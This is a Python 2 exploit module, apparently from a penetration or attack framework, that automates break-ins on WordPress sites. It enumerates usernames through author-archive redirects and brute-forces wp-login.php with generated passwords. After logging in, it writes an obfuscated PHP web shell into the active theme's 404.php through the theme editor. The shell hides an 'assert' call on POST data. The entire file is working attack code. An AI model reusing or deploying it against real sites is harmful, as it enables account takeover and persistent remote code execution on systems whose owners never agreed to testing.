#coding: utf-8

import os
import sys
import datetime
import urllib
from exp_template import Exploit, Level, session, get_random_password
from pyquery import PyQuery as pq
import re
import requests

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit
exp失效无法打击
modify by swm 20180817

"""
class wordpress_week_password(Exploit):
    def meta_info(self):
        return {
            'name': 'wordpress_week_password',
            'author': 'h',
            'date': '2018-02-26',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'WordPress',
            'min_version': '',
            'max_version': '',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'WordPress弱口令自动GetShell，自动检查WordPress弱口令，并上传WebShell',
            'reference':'',   #参考文档
            'cve':'',
        }
        
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        Exploit.__init__(self, url, taskid, targetid, cmd_connect, data_redirect, dns_server, proxies)
        self.randpass = get_random_password()
        self.chrome = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'
        self.headers = {'User-Agent': self.chrome}
        self.password = set()
        self.template = set()
        self.users = set()
        self.site = self.url.strip('http://').strip('https://').split('/')[0]
        self.form = {}
        self.success = {}
        self.noexist = []
        self.counttext = 0
        
    def exploit(self):
        self.chrome = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'
        self.headers = {'User-Agent': self.chrome}
        self.password = set()
        self.template = set()
        self.users = set()
        self.site = self.url.strip('http://').strip('https://').split('/')[0]
        self.form = {}
        self.success = {}
        self.noexist = []
        self.counttext = 0
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        #检查登陆框
        if not self.CheckCMS():
            self.report('can\'t find wordpress login form', Level.error)
            return
        #明文输入框个数，检查是否有验证码输入框
        if self.counttext != 1:
            self.report("login form has more input", Level.error)
            return
        #获取用户列表
        self.GetUsers()
        if len(self.users) == 0:
            self.report('can\'t get users list', Level.error)
            return
        for user in self.users:
            #生成密码列表
            self.GenPass(user)
            for password in self.password:
                status = self.CrackTest(user, password)
                if status == 'shell':
                    return
                elif status == 'noexist':
                    break
        
    def get_verion(self):
        req = session()
        rsp = req.get(url=url)
        if rsp:
            m = re.search(r'<meta\s*name="generator"\s*content="WordPress\s*([\d\.]*)"\s/>', rsp.text)
            return m.group(1) if m else 'unkown'
            
    def GetUsers(self):
        for i in range(0, 10):
            last_len = len(self.users)
            url = self.url + '/?author=%d'%(i+1)
            req = session()
            rsp = req.get(url=url)
            if url != rsp.url:
                m = re.search(r'/author/([\-\w]+)', rsp.url)
                if m:
                    self.users.add(m.group(1).lower())
                    continue                    
            for find_str in [
                r'/author/([\-\w]+)/feed',
                r'<body\s*class="[\w ]*author-([\-\w]+)',
                r'<span class="author"><a .*rel="author">([\-\w]+)</a></span>',
                r'<title>([\-\w]+) \| ',
                r'<title>([\-\w]+) - ',
                ]:
                m = re.search(find_str, rsp.text)
                if m:
                    self.users.add(m.group(1).lower())
                    continue
            break                   
        
    def GenPass(self, user):
        self.password = set()
        try:
            for passwd in open('config/wordpress_pass.txt'):
                self.template.add(passwd.strip('\r\n'))
        except:
            self.report('can\'t open config/wordpress_pass.txt', Level.error)
            return
        if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', self.site):
            site = ['']
        else:
            site = self.site.replace('www.', '')
            site = site.split('.')
            for i in range(0, len(site)):
                if i == len(site)-2 and len(site[i]) <= 3:
                    site[i] = ''
                elif i == len(site)-1:
                    site[i] = ''
            site = set(site).remove('')
        for t in self.template:
            if t.find('%user%') >= 0:
                if t.find('%web%') >= 0:
                    for s in site:
                        self.password.add(t.replace('%user%', user).replace('%web%',  s))
                else:
                    self.password.add(t.replace('%user%', user))
            elif t.find('%web%') >= 0:
                for s in site:
                    if s != '':
                        self.password.add(t.replace('%web%',  s))
            else:
                self.password.add(t)

    def CheckCMS(self):
        try:
            req = session()
            rsp = req.get(url=self.url+'/wp-login.php')
        except:
            return False
        if rsp.text.find('wp-admin') > 0:
            self.countinput = rsp.text.count('<input ')
            m = re.search(r'<input .*wp.submit.* value="(.*)" />', rsp.text)
            if m:
                #print m.group(1)
                for encoding in ['', 'utf-8', 'gbk']:                    
                    try:
                        self.submit = urllib.quote(m.group(1) if encoding == '' else m.group(1).encode(encoding))
                        break
                    except:
                        continue
            for m in re.finditer(r'<input .*/>', rsp.text):
                #print m.group(0)
                self.countinput += 1
                j = re.search(r'type="*(.*?)"* ', m.group(0))
                k = re.search(r'name="*(.*?)"* ', m.group(0))
                u = re.search(r'value="*(.*?)"* ', m.group(0))
                if j and j.group(1) == 'text':
                    self.counttext += 1
                if k and k.group(1) not in ['log', 'pwd', 'rememberme', 'wp-submit', 'testcookie']:
                    if u:
                        self.form[k.group(1)] = u.group(1)
            return True
            
    def CrackTest(self, user, passwd):
        if self.success.has_key(user) or (user in self.noexist):
            return 'noexist'
        for i in range(0,3):
            isok, shell = self.CheckUserPass(user, passwd)
            if isok:
                self.success[user] = passwd
                if shell.find('themes') > 0:
                    self.shell_info(shell, self.randpass, 'php')
                    return 'shell'
                else:
                    self.report('SHELL: Upload Shell Failed[%s] -> %s (%s:%s)' % (shell, self.url, user, passwd), Level.success)
                    return 'noexist'
            else:
                if shell == 'httperr':
                    self.report("ERROR: send request error, retry:%s (%s:%s) -> %s" % ("yes" if i < 2 else "no", user, passwd, self.url))
                if shell == 'usererr':
                    self.report("ERROR: user not found or too many failed, jump user[%s] (%s) -> %s" % (user, passwd, self.url))
                    self.noexist.append(user)
            if not isok and shell in ['passerr']:
                break
            
    def CheckUserPass(self, user, passwd):
        req = session()
        requests.utils.add_dict_to_cookiejar(req.cookies, {"wordpress_test_cookie":"WP+Cookie+check"})  
        postData = {
            'log' : user,
            'pwd' : passwd,
            'wp-submit' : self.submit,
            'testcookie' : 1,
        }
        postData = dict(postData, **self.form)
        try:
            rsp = req.post(url='%s/wp-login.php'%self.url, data=postData, timeout=5)
        except Exception, e:
            self.report('connect faild_1', Level.error)
            return False, 'httperr'
        respHtml = rsp.text        
        if respHtml.find('<div id="login_error">') > 0:
            if respHtml.find('<strong>%s</strong>'%user) <= 0:                
                # 'The password you entered for the username'
                return False, 'usererr'    #user not exist or too many login faild                
            else:
                return False, 'passerr'    #user exist, but passwd error
        else:
            if respHtml.find('"dashboard') < 0:
                return False, 'usererr'    #user not exist
            else:
                pass
        self.report('login ok. %s (%s:%s)' % (self.url, user, passwd), Level.success)
        #upload shell
        filename = '404.php'
        try:
            rsp = req.get(url='%s/wp-admin/theme-editor.php?file=%s'%(self.url, filename), timeout=5)
        except:
            return True, 'httperr'
        ss = pq(rsp.text)
        wpnonce  = ss('input#_wpnonce').attr('value')
        content  = ss('textarea#newcontent').text()
        theme = ss('select#theme').val()
        if wpnonce in ['', None]:
            return True, 'editerr'
        shelltxt = [
            "<?php",
            "if(isset($_POST['%s'])){",
            "$item['ersxf2d'] = strrev('t'./*-/*-*/'r'./*-/*-*/'es'./*-/*-*/'sa');",
            "$array[] = $item;",
            "/*yD4kpPnRwvSTeGH*/",
            "$array[0]['ersxf2d']($_POST['%s']);exit();}",
            "?>",
        ]
        newcontent = '\r\n'.join(shelltxt) % (self.randpass, self.randpass) + content
        reffer = self.url+'/wp-admin/theme-editor.php'
        reffer = reffer.strip('http://').strip('https://')
        reffer = reffer[reffer.find('/'):]
        data = {
            "_wpnonce" : wpnonce,
            "_wp_http_referer" : reffer,
            "newcontent" : newcontent,
            "action" : "update",
            "file" : filename,
            "theme" : theme,
            "submit" : "Update File",
            "scrollto" : 0,
            "docs-list" : "",
        }
        try:
            rsp = req.post(url='%s/wp-admin/theme-editor.php'%self.url, data=data, timeout=5)
        except:
            return True, 'httperr'
        if rsp.text.find("yD4kpPnRwvSTeGH") > 0:
            return True, '%s/wp-content/themes/%s/%s'%(self.url, theme, filename)
        else:
            return True, 'unkownerr'
        
if __name__ == "__main__":
    url = 'http://localhost:94/wordpress/wp-login.php'
    a = wordpress_week_password(url)
    a.exploit()
    # if len(sys.argv) == 2:
    #     a = wordpress_week_password(sys.argv[1])
    #     a.exploit()
    # else:
    #     print '%s url' %  __file__
    #     print '%s http://192.168.1.11' %  __file__
#

 





